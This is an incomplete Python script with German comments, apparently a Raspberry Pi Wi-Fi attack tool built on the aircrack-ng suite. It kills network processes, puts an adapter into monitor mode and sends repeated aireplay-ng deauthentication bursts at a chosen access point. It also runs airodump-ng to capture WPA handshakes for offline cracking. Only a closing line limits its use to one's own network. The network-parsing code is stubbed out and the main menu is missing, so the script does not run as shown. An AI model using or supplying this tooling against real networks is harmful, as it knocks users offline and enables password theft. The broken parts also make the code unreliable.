#!/usr/bin/env python3
import subprocess
import os
import time
import glob
import shutil
import sys
import re
import threading
import signal
from datetime import datetime

# ====================== KONFIG ======================
SCAN_DURATION = 15
DEAUTH_BURSTS = 5
DEAUTH_PACKETS_PER_BURST = 10
# ===================================================

def run_cmd(cmd, shell=False, check=True):
    """Erweiterte run_cmd mit besserer Fehlerausgabe"""
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, check=check)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"FEHLER bei Befehl: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
        print(f"Ausgabe: {e.stdout}")
        print(f"Fehler: {e.stderr}")
        return e.stdout + (e.stderr or "")

def is_root():
    if os.geteuid() != 0:
        print("FEHLER: Skript muss mit sudo ausgeführt werden!")
        print("   sudo python3 wifi_tool.py")
        sys.exit(1)

def kill_interfering_processes_safe():
    print("--- Airmon-ng bereinigt störende Prozesse (sicherer Modus)...")
    output = run_cmd(["airmon-ng", "check", "kill"], check=False)
    print(output.strip() or "Keine störenden Prozesse gefunden.")
    time.sleep(2)

def list_wireless_interfaces():
    interfaces = []
    try:
        output = run_cmd(["iw", "dev"])
        for line in output.splitlines():
            if "Interface" in line:
                iface = line.split()[-1].strip()
                if iface:
                    interfaces.append(iface)
    except:
        pass
    
    if not interfaces:
        output = run_cmd(["iwconfig"])
        for line in output.splitlines():
            if line.strip() and "no wireless extensions" not in line.lower():
                iface = line.split()[0].strip()
                if iface and iface not in interfaces:
                    interfaces.append(iface)
    
    return sorted(list(set(interfaces)))

def select_interface():
    wlans = list_wireless_interfaces()
    if not wlans:
        print("FEHLER: Kein WLAN-Adapter gefunden. Stecke deinen USB-Adapter ein.")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("VERFUEGBARE WLAN-ADAPTER:")
    print("="*60)
    for i, iface in enumerate(wlans, 1):
        print(f"{i:2d}. {iface}")
    print("="*60)
    
    while True:
        try:
            choice = int(input("\nWelchen Adapter verwenden? (Nummer): "))
            if 1 <= choice <= len(wlans):
                return wlans[choice - 1]
            print("Ungültige Nummer!")
        except ValueError:
            print("Bitte nur eine Zahl eingeben!")

def enable_monitor_mode(interface):
    print(f"--- Aktiviere Monitor-Mode auf {interface}...")
    run_cmd(["airmon-ng", "start", interface])
    time.sleep(3)
    
    mon_interface = None
    for _ in range(12):
        time.sleep(1)
        output = run_cmd(["iwconfig"])
        for line in output.splitlines():
            if "Mode:Monitor" in line:
                mon_interface = line.split()[0].strip()
                if mon_interface:
                    print(f"Monitor-Interface: {mon_interface}")
                    return mon_interface
    fallback = f"{interface}mon"
    print(f"Versuche Fallback: {fallback}")
    return fallback

# ... (scan_networks, print_networks bleiben fast gleich – nur kleine Verbesserungen bei Fehlerbehandlung)

def scan_networks(mon_interface):
    print(f"--- Scanne {SCAN_DURATION} Sekunden nach Netzwerken...")
    scan_prefix = "scan"
    for f in glob.glob(f"{scan_prefix}*"):
        try: os.remove(f)
        except: pass
    
    run_cmd(["timeout", str(SCAN_DURATION), "airodump-ng", mon_interface, "-w", scan_prefix, "--output-format", "csv"])
    
    csv_file = f"{scan_prefix}-01.csv"
    if not os.path.exists(csv_file):
        print("FEHLER: Scan-Datei nicht erstellt.")
        return []
    
    # ... (Rest wie vorher – Parsing bleibt gleich)
    # (Aus Platzgründen hier gekürzt – kopiere den Parsing-Teil aus der vorherigen Version)
    networks = []  # ← hier den vollständigen Parsing-Code aus der letzten Version einfügen
    # ... networks.sort(...) 
    return networks

# Nur Deauth (mit sauberem Stop)
def only_deauth(mon_interface, selected, stop_event):
    print(f"--- Starte NUR Deauth auf {selected['essid']} ...")
    print("Drücke ENTER zum Beenden.")
    
    def deauth_loop():
        while not stop_event.is_set():
            try:
                subprocess.run([
                    "aireplay-ng", "-0", str(DEAUTH_PACKETS_PER_BURST),
                    "-a", selected["bssid"], mon_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            except:
                pass
            time.sleep(1.5)
    
    t = threading.Thread(target=deauth_loop, daemon=True)
    t.start()
    input()
    stop_event.set()
    print("--- Deauth wird gestoppt...")

# Capture + Deauth mit besserem Prozess-Management
def capture_with_deauth(mon_interface, selected):
    capture_prefix = "handshake_capture"
    for f in glob.glob(f"{capture_prefix}*"):
        try: os.remove(f)
        except: pass
    
    print(f"--- Starte Capture + Deauth für {selected['essid']} ...")
    
    airodump = subprocess.Popen([
        "airodump-ng", "-c", selected["channel"],
        "--bssid", selected["bssid"], "-w", capture_prefix, mon_interface
    ])
    
    deauth_stop = threading.Event()
    
    def deauth_thread():
        for i in range(DEAUTH_BURSTS):
            if deauth_stop.is_set():
                break
            print(f"   Deauth-Burst {i+1}/{DEAUTH_BURSTS}")
            try:
                subprocess.run([
                    "aireplay-ng", "-0", str(DEAUTH_PACKETS_PER_BURST),
                    "-a", selected["bssid"], mon_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            except:
                pass
            time.sleep(3)
    
    threading.Thread(target=deauth_thread, daemon=True).start()
    
    print("\nWarte auf 'WPA handshake' Meldung. Drücke ENTER zum Beenden.")
    input()
    
    # Sauberes Beenden
    deauth_stop.set()
    if airodump.poll() is None:
        airodump.terminate()
        try:
            airodump.wait(timeout=5)
        except:
            airodump.kill()
    
    subprocess.run(["pkill", "-9", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # als letzte Sicherheit
    
    cap_files = glob.glob(f"{capture_prefix}-*.cap")
    if cap_files:
        cap_file = max(cap_files, key=os.path.getctime)
        print(f"ERFOLG: Capture-Datei: {cap_file}")
        return cap_file
    return None

def restore_network(interface, mon_interface):
    print("\n--- Versuche System wiederherzustellen...")
    run_cmd(["airmon-ng", "stop", mon_interface])
    time.sleep(2)
    
    # Interface zurück in Managed-Mode
    run_cmd(["ip", "link", "set", interface, "down"])
    run_cmd(["iwconfig", interface, "mode", "managed"])
    run_cmd(["ip", "link", "set", interface, "up"])
    
    # NetworkManager neu starten (falls vorhanden)
    run_cmd(["systemctl", "restart", "NetworkManager"], check=False)
    print("Restore-Versuch abgeschlossen. Prüfe mit 'iwconfig' und 'ip addr'.")

# ====================== HAUPTPROGRAMM ======================
if __name__ == "__main__":
    is_root()
    print("=== WiFi Tool – Sichere Version für Raspberry Pi OS Lite ===")
    print(f"Gestartet: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    kill_interfering_processes_safe()
    
    interface = select_interface()
    mon_interface = enable_monitor_mode(interface)
    
    # Hier scan_networks, Netzwerk-Auswahl, Menü (1/2/3) wie in der vorherigen Version einfügen
    
    # Am Ende des Skripts (nach allen Aktionen):
    restore_network(interface, mon_interface)
    
    print("\nSkript beendet. Nur für dein eigenes WLAN verwenden!")
